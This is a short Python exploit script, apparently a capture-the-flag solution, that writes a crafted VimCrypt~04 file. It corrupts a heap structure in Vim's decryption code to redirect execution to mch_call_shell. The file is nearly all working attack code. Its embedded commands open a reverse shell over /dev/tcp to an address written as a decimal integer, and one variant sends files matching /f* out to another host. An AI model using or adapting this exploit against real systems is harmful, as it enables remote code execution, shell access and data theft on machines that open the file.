# adjust the size of input buffer so that it locate near the perm_state_T in the heap
# underflow ps->step into 1
# overwrite ps->buffer to near free at plt (0x8a8238)
# then overwrite buffer into &mch_call_shell

from pwn import p32,p64

header='VimCrypt~04!'
cmd = 'sh>& /dev/tcp/2130706433/1 0>&1\x00'
#cmd = 'bash -c "cat /f*>/dev/tcp/2130706433/1"\x00'
cmd = 'bash -c "cat /f*>/dev/tcp/2886795265/1"\x00'
f = open('exp.txt','w')
f.write(header)
p = '\xb5\x00\x00\x60'
p += 'a'
p += '\x00'
p += p32(0xdb9)
p += p32(0xdbd)
p += p32(0xffffffe0)
p += p64(0x8a8238-40)
p += p64(0)
p += p64(0xdd1)
p += 'aaaa'
p2 = ''
assert len(cmd)==40
p2 += cmd
p2 += p64(0x53f37f) # &mch_call_shell
addr = 0x4036b6
while len(p2)<0x61:
    p2 += p64(addr)
    addr += 0x10
p += p2
p = p.ljust(3517,'a')
f.write(p)
f.close()
